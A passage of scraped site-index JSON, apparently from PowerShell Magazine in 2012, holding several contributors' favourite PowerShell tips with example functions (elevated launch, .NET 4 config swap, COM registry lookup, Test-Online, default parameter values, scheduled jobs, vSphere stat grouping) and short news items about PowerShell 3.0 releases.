Steele’s Favorite PowerShell Tips and Tricks"},{"categories":["Tips and Tricks"],"contents":"I am a developer by trade and primarily use PowerShell to aid in my development practices. The majority of the time I’m a .NET developer, which means I can use PowerShell to quickly prototype what I’m working on. This often requires me to run PowerShell as an administrator.\nRunning PowerShell as an Administrator You can easily right click on the PowerShell icon and select ‘Run as Administrator’ and the User Account Control (UAC) dialog will be presented. This method works OK, but it requires me to use my mouse and navigate a context menu. It’s time consuming. Instead you can easily run PowerShell as administrator right from another PowerShell window with the following command line.\nStart-Process PowerShell –Verb RunAs The RunAs verb is a special verb in Windows that enables processes to request elevation. Once we accept the UAC prompt we will have an elevated command prompt running and we don’t have to use a mouse.\nRunning PowerShell under .NET 4.0 A lot of the things I develop are written in .NET 4.0. PowerShell v2.0, natively, runs under the .NET 2.0 Framework. There are a couple of tricks that can be used to run PowerShell under .NET 4.0. The first is to use the UseOnlyLastestClr Registry value. Never do this! This is especially true for a developer. It is a system wide setting that will cause everything to run under .NET 4.0 and can cause a lot of compatibility problems. Instead, an app.config is the recommended practice. An app.config can direct a particular application to run under a specific .NET version. By placing a configuration file in the $PSHome directory, with the name powershell.exe.config and the following contents, we can get PowerShell to run under .NET 4.0.\n\u0026lt;?xml version=\"1.0\" encoding=\"utf-8\"?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;startup useLegacyV2RuntimeActivationPolicy=\"true\"\u0026gt; \u0026lt;supportedRuntime version=\"v4.0.30319 \" /\u0026gt; \u0026lt;/startup\u0026gt; \u0026lt;/configuration\u0026gt;  The problem with the app.config file is that it is buried in the system and requires an elevated text editor to be opened to make modifications. Instead, I created an advanced function to allow me to specify the .NET version I’d like to run under. It backs up the configuration file if one is there already.\nif(Test-Path $PowerShellConfigPath) { $PreviousContents = Get-Content -Path $PowerShellConfigPath Remove-Item $PowerShellConfigPath }  It writes out the configuration file for the specified .NET version.\nSet-Content -Path $PowerShellConfigPath -Value $ConfigFileContents Then it starts PowerShell.\n$process = Start-Process PowerShell -ArgumentList \"-noexit\" –PassThru And finally, it waits until .NET is loaded into the process before removing or replacing the file that was created. If we were to remove the file too quickly it won’t have time to read the contents and will run under the default or previously configured .NET version.\nwhile((Get-Process -Id $process.Id | Select -Expand Modules | Where { $_.ModuleName -match $mscor }| Measure-Object | Select-Object -ExpandProperty count) -eq 0) { Start-Sleep -Seconds 1 }  All of this is wrapped in a Start-PowerShell function that I can call like so.\nStart-PowerShell –DotNetVersion v4 Remember that because this is modifying a file in the system directory, the PowerShell command window will need to be started as administrator. I added an AsAdmin switch for this purpose.\nStart-PowerShell –AsAdmin As an aside, this will not be an issue in PowerShell 3.0 because the PowerShell command prompt will always run under .NET 4.0. It may become an issue in the future when .NET 5.0 is released. 😉\nFinding COM Object Information COM interop in PowerShell is great. The ability to quickly load up, discover and utilize COM objects is really helpful. A lot of times I need to know exactly where a COM object has been loaded from and what version is registered. With other .NET assemblies we can use the Assembly parameter to find out this information. Since COM Interop is generated on the fly, this is the result of the same strategy on a COM object.\n$ie = New-Object –ComObject InternetExplorer.Application $ie.GetType().Assembly GAC Version Location --- ------- -------- True v4.0.30319 c:\\Windows\\Microsoft.NET\\...\\mscorlib.dll Since the type was auto-generated, the assembly reports as mscorlib.dll. We can see that the PSTypeNames reports a similarly, interminable list of types.\n$ie.PSTypeNames System.__ComObject#{d30c1661-cdaf-11d0-8a3e-00c04fc9e26e} System.__ComObject System.MarshalByRefObject System.Object  To get around this I created a function that uses the Registry provider to look up the registration and version information for a COM object. We just need to specify the ProgId and the information will be returned.\nPS\u0026gt; Get-ComInformation InternetExplorer.Application Path Version ---- ------ \u0026quot;C:\\Program Files\\Internet Explorer\\ie... 9.00.8112.16421... This is accomplished by creating a new drive to the HKEY classes root Registry hive. This drive does not exist by default.\nNew-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null  Then we look up the class ID.\n$clsid = Get-ItemProperty -Path \"HKCR:\\$Name\\CLSID\"  Next, we can query the Local or InProc COM server information.\n$serverInfo = Get-ItemProperty -Path \"HKCR:\\CLSID\\$($clsid.'(default)')\\InProcServer32\"  Finally, we can use the .NET FileVersionInfo class to query the version information of the EXE or DLL.\n[Diagnostics.FileVersionInfo]::GetVersionInfo($serverInfo.'(default)'.Replace('\"', '')) It’s then written out as a custom PSObject to the pipeline for consumption. This is really helpful when a script requires a particular version of a COM object. It’s also nice to quickly identify when a rogue COM DLL gets registered in a place other than the one we are expecting.\nHere’s are the functions mentioned in the post:\nfunction global:Start-PowerShell { [CmdletBinding()] param( [ValidateSet(\u0026quot;v2\u0026quot;,\u0026quot;v4\u0026quot;)] [Parameter()] $DotNetVersion = \u0026quot;v2\u0026quot;, [Parameter()] [Switch]$AsAdmin ) Begin { $ConfigFileContents = \u0026quot;\u0026amp;lt;?xml version=`\u0026quot;1.0`\u0026quot; encoding=`\u0026quot;utf-8`\u0026quot;?\u0026amp;gt; \u0026amp;lt;configuration\u0026amp;gt; \u0026amp;lt;startup useLegacyV2RuntimeActivationPolicy=`\u0026quot;true`\u0026quot;\u0026amp;gt; \u0026amp;lt;supportedRuntime version=`\u0026quot;{0}`\u0026quot; /\u0026amp;gt; \u0026amp;lt;/startup\u0026amp;gt; \u0026amp;lt;/configuration\u0026amp;gt;\u0026quot; $PowerShellConfigPath = Join-Path $PSHOME \u0026quot;powershell.exe.config\u0026quot; Write-Verbose \u0026quot;Replacing $PowerShellConfigPath...\u0026quot; if ($DotNetVersion -eq \u0026quot;v2\u0026quot;) { $ConfigFileContents = $ConfigFileContents -f \u0026quot;v2.0.50727\u0026quot; $mscor = \u0026quot;mscorwks\u0026quot; } elseif ($DotNetVersion -eq \u0026quot;v4\u0026quot;) { $ConfigFileContents = $ConfigFileContents -f \u0026quot;v4.0.30319\u0026quot; $mscor = \u0026quot;mscoree\u0026quot; } Write-Verbose $ConfigFileContents if (Test-Path $PowerShellConfigPath) { $PreviousContents = Get-Content -Path $PowerShellConfigPath Remove-Item $PowerShellConfigPath } Set-Content -Path $PowerShellConfigPath -Value $ConfigFileContents Start-Sleep -Seconds 1 if ($AsAdmin) { $process = Start-Process PowerShell -Verb RunAs -ArgumentList \u0026quot;-noexit\u0026quot; -PassThru } else { $process = Start-Process PowerShell -ArgumentList \u0026quot;-noexit\u0026quot; -PassThru } while((Get-Process -Id $process.Id | Select -Expand Modules | Where { $_.ModuleName -match $mscor }|Measure-Object | Select -ExpandProperty count) -eq 0) { Start-Sleep -SEconds 1 } Write-Verbose \u0026quot;$($process.Modules | Where { $_.ModuleName -match $mscor })\u0026quot; if ($PreviousContents -ne $null) { Set-Content -Path $PowerShellConfigPath -Value $PreviousContents } else { Remove-Item -Path $PowerShellConfigPath } } } function global:Get-ComInformation { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$Name ) begin { if ((Get-PSDrive HKCR -ErrorAction SilentlyContinue) -eq $null) { New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null } } process { if (!(Test-Path \u0026quot;HKCR:\\$Name\\CLSID\u0026quot;)) { Write-Error \u0026quot;ProgId [$Name] was not found.\u0026quot; return } $clsid = Get-ItemProperty -Path \u0026quot;HKCR:\\$Name\\CLSID\u0026quot; if (Test-Path -Path \u0026quot;HKCR:\\CLSID\\$($clsid.'(default)')\\InProcServer32\u0026quot;) { $serverInfo = Get-ItemProperty -Path \u0026quot;HKCR:\\CLSID\\$($clsid.'(default)')\\InProcServer32\u0026quot; } elseif (Test-Path -Path \u0026quot;HKCR:\\CLSID\\$($clsid.'(default)')\\LocalServer32\u0026quot;) { $serverInfo = Get-ItemProperty -Path \u0026quot;HKCR:\\CLSID\\$($clsid.'(default)')\\LocalServer32\u0026quot; } else { Write-Error \u0026quot;Failed to locate the server information for COM object [$Name].\u0026quot; return } if ($serverInfo.Version -ne $null) { $version = $serverInfo.Version } elseif ($serverInfo.'(default)' -ne $null) { $version = [Diagnostics.FileVersionInfo]::GetVersionInfo($serverInfo.'(default)'.Replace('\u0026quot;', '')).FileVersion } if ($serverInfo.CodeBase -ne $null) { $path = $serverInfo.CodeBase } elseif ($serverInfo.Assembly -ne $null) { $path = $serverInfo.Assembly } elseif ($serverInfo.'(default)' -ne $null) { $path = $serverInfo.'(default)' } $properties = @{ Path = $path ThreadingModel = $serverInfo.'ThreadingModel' Version = $version } New-Object PSObject -Property $properties } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/11/adam-driscolls-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Adam Driscoll’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["News"],"contents":"We are pleased to announce the availability of Windows PowerShell 3.0 quick reference guides that PowerShell Magazine has created and are now part of “Windows PowerShell 3.0 and Server Manager Quick Reference Guides” package that you can download on the Microsoft Download Center.\nThe PDF files in this download are quick reference (also called “cheat sheet”) guides for IT professionals and scripting enthusiasts who want to learn tips, shortcuts, common operations, limitations, and proper syntax for using Windows PowerShell 3.0 and Server Manager in Windows Server 2012 Release Candidate.\nThe download package contains the following files:\n•PowerShell_LangRef_v3.pdf – This four-page reference describes operators, arrays, automatic and preference variables, useful Windows PowerShell 3.0 commands, methods, and reading and tutorial resource list.\n•PowerShell_ISE_v3.pdf – This two-page reference describes keyboard shortcuts that you can use to navigate Windows PowerShell Integrated Scripting Environment (ISE) more quickly, and introduces the new ISE object model.\n•PowerShell_Examples_v3.pdf – This two-page reference describes how to perform popular IT management and scripting tasks by using Windows PowerShell 3.0, including how to fetch data by using Management OData IIS Services, how to schedule jobs, how to install Windows PowerShell Web Access by using Windows PowerShell cmdlets, and how to create new SMB file shares.\n•Quick_Reference_SM_WS12.pdf – This two-page reference describes common tasks that you can perform in the new Server Manager console in Windows Server 2012 Release Candidate and where to find documentation to help you manage multiple, remote servers by using Server Manager and Windows PowerShell.\nIf you are attending TechEd NA conference in Orlando next week, you can also get these quick reference guides at Windows Server 2012 Server Manager \u0026amp; PowerShell station in the Technical Learning Center (TLC). Stop by to learn more about Windows PowerShell 3.0 and Server Manager.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/09/windows-powershell-3-0-and-server-manager-quick-reference-guides/","tags":["News"],"title":"Windows PowerShell 3.0 and Server Manager Quick Reference Guides"},{"categories":["Tips and Tricks"],"contents":"Choose three of your favourite PowerShell tips they said. Pretty impossible to only feature three, so in the end I have picked a few that I have been working with recently.\nAlias Parameter Attribute If you have a PowerShell function with parameters and you can’t decide on the parameter name because you potentially have multiple different matches, you can use the Alias parameter attribute to define them. Look at the following example function foo which can take some text and output it:\nfunction foo { param ( [Parameter(ValueFromPipelineByPropertyName=$True)] $text ) Write-Output $text } It can take input from the pipeline by Property Name, i.e. if the object being passed has a property which matches the parameter name ‘text’:\nbut if there’s no match then it fails:\nHowever, if we add an alias ‘name’ for the ‘text’ parameter, then we can match other input:\nfunction foo { param ( [Parameter(ValueFromPipelineByPropertyName=$True)] [Alias(\u0026quot;Name\u0026quot;)] $text ) Write-Output $text } This can be particularly useful if you are using a ComputerName parameter, since you could create multiple aliases, e.g.:\n[Alias('CN','__SERVER','IPAddress','Server','ComputerName')] If you’re wondering why use\n__SERVER Then that’s because it is very commonly found in WMI:\nThe next two tips are from PowerShell 3.0 RC, how they work may change by RTM.\n[pscustomobject] In PowerShell 2.0 there are a number of different ways to create custom objects. Typically I am using these when generating report data and I want to change the labels presented for properties of the objects being returned because they don’t meet my needs.\nIn the following example I create a custom object of WMI data and change some of the labels. Unfortunately when it is output, I can’t control the order for the report, so I need to use Select-Object and specify the order I need.\nfunction Get-Info { $wmiquery = Get-WmiObject -Class Win32_ComputerSystem New-Object psobject -Property @{ ServerName = $wmiquery.Caption HypervisorType = $wmiquery.Manufacturer OS = (Get-WmiObject Win32_OperatingSystem).Caption BiosVersion = (Get-WmiObject Win32_Bios).SMBIOSBIOSVersion TimeZone = (Get-WmiObject Win32_Timezone).Caption } } PowerShell 3.0 introduces [pscustomobject] which I can use instead to create this custom object. Not only will I get the order I need, but typically you will see a significant performance increase too.\nfunction Get-Info { $wmiquery = Get-WmiObject -Class Win32_ComputerSystem [pscustomobject] @{ ServerName = $wmiquery.Caption HypervisorType = $wmiquery.Manufacturer OS = (Get-WmiObject Win32_OperatingSystem).Caption BiosVersion = (Get-WmiObject Win32_Bios).SMBIOSBIOSVersion TimeZone = (Get-WmiObject Win32_Timezone).Caption } } Invoke-RestMethod A fun one to finish off. PowerShell 3.0 introduces a new cmdlet, Invoke-RestMethod. You can use this cmdlet to interface with any REST-based API. So you might use this to manage an application which doesn’t have PowerShell cmdlets supplied by the vendor, but does supply an API.\nYou can use Invoke-RestMethod with the Twitter API, e.g.:\nInvoke-RestMethod -Uri \"http://search.twitter.com/search.json?q=PowerShell 3.0\" | Select-Object -ExpandProperty Results | Format-Table from_user,text -AutoSize  If you wish to search for more than the basic set of results, you can extend the query to include multiple pages, then loop through them. I bundled this up into the below function.\nfunction Get-TwitterSearch { [CmdletBinding()] param ( [parameter(mandatory=$true)] [ValidateNotNullorEmpty()] [string]$query ) $i = 1 do { $uri = \u0026quot;http://search.twitter.com/search.json?include_entities=true\u0026amp;amp;result_type=recent\u0026amp;amp;rpp=100\u0026amp;amp;page=$i\u0026amp;amp;q=$query\u0026quot; $TwitterSearch = Invoke-RestMethod -Uri $uri $TwitterSearchResults = $TwitterSearchResults + $TwitterSearch.Results $i++ } while ($TwitterSearch.next_page -ne $null -and $i -le 10) $TwitterSearchResults }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/07/jonathan-medds-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Jonathan Medd’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["Module Spotlight","ShowUI"],"contents":"The techniques used in this article are covered in deeper detail in Doug Finke’s book “Windows PowerShell for Developers” . Microsoft TechEd NA 2012 is just around corner. One way to get at content catalog is through the web page at http://goo.gl/EMCYo. Another way is to use PowerShell v3 and ShowUI.\nHere is the PowerShell WPF GUI that lets you search the TechEd content catalog; simple and easy, read on to see what else you can do with this PowerShell script, download it and check out how it was built.\nPlay Along If you want to try this out you need a few things:\n PowerShell v3 is already a part of Windows 8 RP and Windows Server 2012 RC; for downlevel operating systems, like Windows 7 you can download it at http://goo.gl/x2KuA My TechEd PowerShell Scripts https://skydrive.live.com/redir?resid=5DEC3B62D9308943!765 ShowUI module for the custom WPF GUI http://showui.codeplex.com/  The only requirements are PowerShell v3 and the TechEd PowerShell scripts.\nTechEd Content at the Command Line Here are some alternate ways to interact with the TechEd content catalog. You can run this script at the command line and search for any session with the string 2012 in it. Then pipe it to Out-GridView cmdlet.\n PS\u0026gt; .\\Get-TechEdTitle.ps1 2012 | Out-GridView   Here is the result. You can further search/subset the list by typing in the text box at the top.\nTechEd Content and Excel Using a couple more built-in PowerShell cmdlets, I can find all the session titles that contain the word storage and export the results to a comma-separated value file (CSV) and then open it in Excel, using Invoke-Item.\nPS\u0026gt; .\\Get-TechEdTitle.ps1 storage | Export-Csv .\\storage.csv –NoTypeInformation PS\u0026gt; Invoke-Item .\\storage.csv How It’s Done The interesting parts about this script are two-fold. First, the new PowerShell v3 cmdlet Invoke-RestMethod is being used to retrieve the TechEd content catalog via the Internet. Second, Microsoft makes the catalog accessible using OData (Open Data Protocol) http://www.odata.org/. OData is an open protocol for sharing data.\n The protocol allows for a consumer to query a datasource over the HTTP protocol and get the result back in formats like Atom, JSON or plain XML, including pagination, ordering or filtering of the data.\n PowerShell v3 makes it super easy to consume OData feeds whether they served either up as XML or JSON format. Invoke-RestMethod auto-detects the format, consumes it and returns PowerShell objects ready for use.\nOne of the nice things that OData supports is the $filter system query option, allowing clients to filter the data from the URL. $filter specifies conditions that MUST be met by the target service for it to be returned.\nparam ([string]$Title) $Global:baseUrl = 'http://odata.msteched.com/tena2012/sessions.svc/' $Global:url = $baseUrl + 'Sessions' $search = $url + \u0026quot;?`$filter=substringof('$($Title)', Title)\u0026quot; Invoke-ODataTransform (Invoke-RestMethod $search) Here is the Invoke-ODataTransform function. In a nutshell here is what it does. The XML data returned from the OData query contains data types of string and System.Xml.XmlElement. Strings can be used as is, when you encounter a System.Xml.XmlElement, you need to get the #text property.\nHere is one way to get this done.\nfunction Global:Invoke-ODataTransform ($records) { $propertyNames = ($records | Select -First 1).content.properties | Get-Member -MemberType Properties | Select -ExpandProperty name foreach($record in $records) { $h = @{} $h.ID = $record.ID $properties = $record.content.properties foreach($propertyName in $propertyNames) { $targetProperty = $properties.$propertyName if($targetProperty -is [System.Xml.XmlElement]) { $h.$propertyName = $targetProperty.'#text' } else { $h.$propertyName = $targetProperty } } [PSCustomObject]$h } } I encourage you to download and run the PowerShell script that uses ShowUI and displays the WPF GUI. ShowUI is a PowerShell module to help build WPF user interfaces in script. ShowUI makes the complicated world of WPF easy to use in PowerShell. You can use ShowUI to write simple WPF gadgets, quick front ends for your scripts, components, and full applications.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/07/interacting-with-teched-na-2012-schedule-using-powershell-v3/","tags":["OData","ShowUI","Modules"],"title":"Interacting with TechEd NA 2012 Schedule using PowerShell v3"},{"categories":["News"],"contents":"Jim Christopher, a Windows PowerShell MVP and a founder of Code Owls LLC, announced the release of SeeShell—a toolkit to visualize the data from various sources such as WMI objects, performance counters, event logs, files, databases, system events, etc.\nSeeShell includes over two dozen types of charts—from simple column graphs to polar scatter plots. The timeline visualization can quickly map data along a time or numeric axis. The grid visualization contains a compelling feature set, including sorting, multi-level grouping, data-aware filtering, and data-aware property summaries.\nGo ahead and try SeeShell. And, when you want a full license, you can buy one over here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/06/visualize-your-data-using-powershell-introducing-seeshell/","tags":["News"],"title":"Visualize your data using PowerShell: Introducing SeeShell"},{"categories":["Tips and Tricks"],"contents":"I use PowerShell practically every day, and I would like to share a few tips and tricks that I use quite often.\nFirst a little bit about myself, I work as a System Administrator for a small financial institution, which has about 200 servers and 250 workstations. I am principally responsible for the Microsoft infrastructure Windows, Active Directly, DNS, Citrix XenAPP, and VMware. Fortunately, most of these products already have good PowerShell integration, so that makes my life a lot easier 🙂\nTest-Online I very often need to query a bunch of machines to gather some sort of information, or change a setting on them. One issue with querying a lot of machines using WMI for instance, is that if the machine is offline, it may take a while for the request to time out, prolonging the overall execution time of the script.\nBecause I do this quite often, I wrote a small function that I added to my profile—the script takes either a list of computers, a collection of Quest Active Roles Computer objects or Microsoft AD computer objects, it then tries to ping them, and depending on the result, the objects will have a property added which states if the computer is “pingable” or not.\nfunction Test-Online { [CmdletBinding()] param( [Parameter(Mandatory=$True,ValueFromPipeline=$True)] $ComputerName ) Process { Switch ($ComputerName.GetType().FullName) { \u0026quot;System.String\u0026quot; {$CompName = $ComputerName} \u0026quot;Quest.ActiveRoles.ArsPowerShellSnapIn.Data.ArsComputerObject\u0026quot; {$CompName = $ComputerName.DnsName} \u0026quot;Microsoft.ActiveDirectory.Management.ADComputer\u0026quot; {$CompName = $ComputerName.DNSHostName} default {$CompName = \u0026quot;Input Type Not Matched\u0026quot;} }\tWrite-verbose \u0026quot;Server: $CompName\u0026quot; If(Test-Connection -Count 3 -ComputerName $CompName -TimeToLive 5 -AsJob | Wait-Job | Receive-Job | Where-Object { $_.StatusCode -eq 0 } ) { Add-Member -InputObject $_ -MemberType NoteProperty -Name OnlineStatus -Value $true Return $_ } Else { Add-Member -InputObject $_ -MemberType NoteProperty -Name OnlineStatus -Value $false Return $_ } } } With the above script, I can test a single computer or a collection of computers if they are online, and since I am using jobs I can test multiple computers at a time, thereby greatly reducing the time it takes. I add a NoteProperty called “OnlineStatus” , which is either $true or $false, I can then query this property to check if a computer is online or not, before I do a WMI query against the machine.\nSo, let’s say I want to test computer Server1 and Server2:\n\"Server1\",\"Server2\" | Test-Online If I want to use the Quest AD cmdlets I can simply do:\nGet-QADComputer | Test-Online | Select-Object Name, OnlineStatus That will run through all computers in AD, and check if they are online, and output their name and “OnlineStatus”.\nShow-ControlPanelItem Another command I have only started using recently is the Show-ControlPanelItem cmdlet (works only in v3).\nThis allows you to start control panel applets from PowerShell without having to click the Start menu and choose “Control Panel”, or that I have to remember the *.cpl names, which for some applets are pretty gnarly.\nSo if I want Internet Explorer settings, I used to run inetcpl.cpl. Now, I can do scp *internet* (scp is an alias I created for Show-ControlPanelItem, and *internet* is much easier to remember than inetcpl.cpl.\nOne thing to be aware of is that if you do Show-ControlPanelItem *i*, it will open all Control Panel applets containing the letter “I”.\nYou can also use Get-ControlPanelItem to get a list of all available Control Panel applets.\nGet-Folder Sometimes when looking for a folder, it is easier to use the graphical interface than traversing directories using cd and dir. A long time ago, I wrote a function to get a graphical folder browser using the Shell.Application COM object.\nFunction Get-Folder { $obj = New-Object -ComObject Shell.Application $bf = $obj.BrowseForFolder(0,\"Choose Folder\",0,\"\") $bf.Self.Path } By using the technique that the command within parenthesis gets evaluated first, we are now able to do something like:\nGet-ChildItem (Get-Folder) The above command will open a GUI which you can use to select a file. The Get-Folder is evaluated first, since it is enclosed in (), and then the folder you choose in the GUI is passed to Get-ChildItem which will list its content.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/05/claus-nielsens-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Claus Nielsen’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["News"],"contents":"Microsoft PowerShell 3.0 First Look, by Adam Driscoll, is a concise overview of the up and coming features and enhancements to PowerShell. Through easy to understand examples readers will quickly get up to speed with the latest version. The book covers some of the exciting new features such as PowerShell Workflow and the new CIM cmdlets. In addition, the reader will learn about enhancements to areas such as PowerShell Remoting and the file system provider. Finally, the book highlights some of the modules and cmdlets found in Windows Server 2012 and Windows 8.\nThe book and eBook are expected July 2012. You can pre-order it now.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/05/microsoft-powershell-3-0-first-look/","tags":["News"],"title":"Microsoft PowerShell 3.0 First Look"},{"categories":["News"],"contents":"The RC version is available for download HERE. You can also find the download link in the Downloads section in the right hand side column of the magazine’s home page.\nWMF RC can be installed on the following Operating Systems:\n Windows 7 Service Pack 1 (32-bit \u0026amp; 64-bit) Windows Server 2008 R2 Service Pack 1 (64-bit only) – Server Core now supported with the RC release. Windows Server 2008 Service Pack 2 (32-bit \u0026amp; 64-bit)  Windows Management Framework 3.0 contains Windows PowerShell 3.0, WMI and WinRM. The package also includes a CIM provider that allows you to collect management data from servers with Windows Management Framework 3.0 installed with the new Server Manager in Windows Server 2012 RC.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/04/windows-management-framework-3-0-rc-is-available-for-download/","tags":["News"],"title":"Windows Management Framework 3.0 RC is available for download"},{"categories":["Tips and Tricks"],"contents":"Disclaimer: This article is written based on the PowerShell 3.0 version available in the Windows 8 Consumer Preview. Features described may change in the final version of the product.\nFeature #1 – Enhancements to the PowerShell ISE I have always used the PowerShell Integrated Scripting Environment (ISE), but not as my primary script editor due to lack of some essential features, like brace matching. This is a very useful feature when working with scripts that contains several loops.\nA major change to the ISE is the combining of the input and output panes which exists in PowerShell ISE 2.0:\nIn PowerShell ISE 3.0 there are 2 panes:\nThe default background color is also changed to be the same as in the PowerShell console (powershell.exe), which I think makes it look and feel more like PowerShell for people opening the ISE for the first time.\nOf course, there are different opinions about this change, as some people do like the input/output panes in PowerShell ISE 2.0, but for me this is a welcome change.\nAnother useful feature I want to highlight is the snippets functionality. Imagine that you are in the middle of writing a script, and you cannot remember the syntax for a switch statement. With the new snippets feature you can hit Ctrl + J to launch the snippets menu, and then type “s” to get to the switch statement:\nThen hit Enter and you will get a sample switch statement to use as a basis:\nThere are too many features in the ISE to cover them all in this article, but enhanced and vastly improved ISE is definitely one of my favorite features in PowerShell 3.0.\nYou can read more about new features in PowerShell ISE in the TechNet article What’s new in the Windows PowerShell ISE. I would also recommend you to read the “Windows PowerShell ISE.pdf” document released with the Windows Management Framework 3.0 – Community Technology Preview (CTP) #2.\nFeature #2 – Default parameter values Another exciting new feature is the $PSDefaultParameterValues preference variable. (For more information about this feature, see about_Parameters_Default_Values.) This is best explained with a few examples. Let us say that you want to use the Send-MailMessage cmdlet:\nSend-MailMessage -From you@domain.com -To itops@domain.com ` -Subject \"Hello world\" -SmtpServer smtp.domain.com If this is a cmdlet you use a lot you will notice that there are some parameters you must specify which is mostly static, in this example the –From and –SmtpServer parameters.\nYou can define the default parameter values for these parameters in a special type of hash table like this:\n$PSDefaultParameterValues = @{ \"Send-MailMessage:From\" = \"you@domain.com\" \"Send-MailMessage:SmtpServer\" = \"smtp.domain.com\" } Now the usage of the Send-MailMessage can be shortened to the following:\nSend-MailMessage -To itops@domain.com -Subject \"Hello world\" Another practical example is the –Credential parameter which can allow you to run all cmdlets that accepts the parameter using the specified alternate credentials:\n$cred = Get-Credential $PSDefaultParameterValues += @{\"*:Credential\"=$cred} When defining the $PSDefaultParameterValues preference variable in your PowerShell profile, the default values you specify will be available in every PowerShell session you open. And if you would like to temporarily turn off the feature, you can disable it like this:\n$PSDefaultParameterValues[“Disabled”] = $true\nFeature #3 – Job Scheduling In previous versions there was no native way in PowerShell to work with scheduled jobs, except from a scheduled tasks module available in the PowerShell Pack which was part of the Windows 7 Resource Kit. Typically you would create a scheduled task which runs powershell.exe, and pass the –Command or –File parameters as arguments to execute your command or script.\nIn PowerShell 3.0 there is a new module called PSScheduledJob which have the following cmdlets:\nThe scheduled jobs created using the module can be found in the Windows Task Scheduler under Task Scheduler Library\\Microsoft\\Windows\\PowerShell\\ScheduledJobs.\nA sample job:\n$jobtrigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(1) Register-ScheduledJob -Name \"PowerShell Scheduled Job Example\" ` -Trigger $jobtrigger -ScriptBlock { Import-Module ActiveDirectory $lockedaccounts = Search-ADAccount -LockedOut if($lockedaccounts){ $body = $lockedaccounts | Select-Object Name | ConvertTo-Html | Out-String Send-MailMessage -From you@domain.com -To itops@domain.com ` -Subject \"Locked accounts\" -Body $body -BodyAsHtml ` -SmtpServer smtp.domain.com } } Note: The sample requires that the Microsoft Active Directory module is available on the computer the job is scheduled to run on.\nHere we can see that the job is created in the Windows Task Scheduler:\nYou can read more about the new job scheduling cmdlets in the Scheduling Background Jobs in Windows PowerShell 3.0 article on the Windows PowerShell Team’s blog.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/03/jan-egil-rings-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Jan Egil Ring’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["Tips and Tricks"],"contents":"I was asked to write about 3 PowerShell features I particularly like. Piece of cake I thought. But with the abundance of possibilities available in PowerShell, the selection of my 3 favorite features proved to be more difficult than I imagined. After some reflection, and looking at some recent functions I wrote, I came up with these gems.\nGrouping stuff I use Group-Object cmdlet quite often when I’m working with vSphere statistics. In PowerCLI the Get-Stat cmdlet allows the retrieval of statistical data from a vCenter database. The cmdlet is quite simple to use; pass the name of an entity (virtual machine, hypervisor…) and specify the metric and a time range. The cmdlet will then return objects that look something like this. The EntityId property is a unique identifier for each entity.\nWhen you have to produce a performance report for many thousands of objects, making individual calls for each of these objects to the Get-Stat cmdlet will be very time-consuming. In other words, your script will take a long time to complete.\nLuckily, you can pass more than 1 entity to a Get-Stat call. The only problem afterwards is how to get the statistical data for each individual entity. And that is where the Group-Object cmdlet is a life-saver.\nYou can specify one or more criteria to group your collection of objects. In this case we will use the EntityId as a grouping criterion. The returned objects, of type GroupInfo, collect all the matching objects. Under the Group property you can access all these matching objects.\nFrom here it is quite easy to produce the report we set out to create.\n$metrics = \u0026quot;cpu.usage.average\u0026quot;,\u0026quot;mem.usage.average\u0026quot; $vms = Get-VM $start = (Get-Date).AddDays(-1) Get-Stat -Entity $vms -Stat $metrics -Start $start | Group-Object -Property EntityId | Foreach-Object{ New-Object PSObject -Property @{ VM = $_.Group[0].Entity.Name Date = $_.Group[0].Timestamp.Date CPU = $_.Group | Where-Object {$_.MetricId -eq $metrics[0]} | Measure-Object -Average -Property Value | Select -ExpandProperty Average Memory = $_.Group | where {$_.MetricId -eq $metrics[1]} | Measure-Object -Average -Property Value | Select -ExpandProperty Average } } | Select VM,Date,CPU,Memory | Export-Csv .\\report.csv -NoTypeInformation -UseCulture Note that we use the Group property combined with a Where-clause to retrieve all the objects, repectively for the CPU and the Memory metric. If you want to read a bit more on vSphere statistics with PowerCLI have a look at my statistics blog posts.\nLiving in another time This tip is something that came from one of my recent posts. I wanted to query the search engine on a Jive Forum. In the function I wanted to be able to specify a Start and Finish timestamp for the search. The problem was that the Jive Forum software wants these timestamp in it’s local timezone, which was in this peticular case PST. Annoying when you run the script from another timezone.\nThe solution in this case was to use one of the .Net methods that is available in your PowerShell session. The TimeZoneInfo class contains a method, called FindSystemTimeZoneById, that allows you to retrieve the characteristics of a timezone by name.\nBy taking the local time and then converting it to the time of the timezone you are interested in, it becomes just a matter of retrieving the time difference between these two to know the actual time difference between the timezone you are in and the other timezone.\n$pst = [TimeZoneInfo]::FindSystemTimeZoneById(\"Pacific Standard Time\") $t0 = Get-Date $t1 = [TimeZoneInfo]::ConvertTime($t0,$pst) $tdiff = $t0 - $t1 $tdiff.Hours Nothing spectacular, just handy when working in different timezones. And it shows how important it is to know about all the .Net classes you can easily access and use from PowerShell.\nPick one! Sometimes you receive a collection of objects and you need to pick one. But which one? You don’t always want to use the first 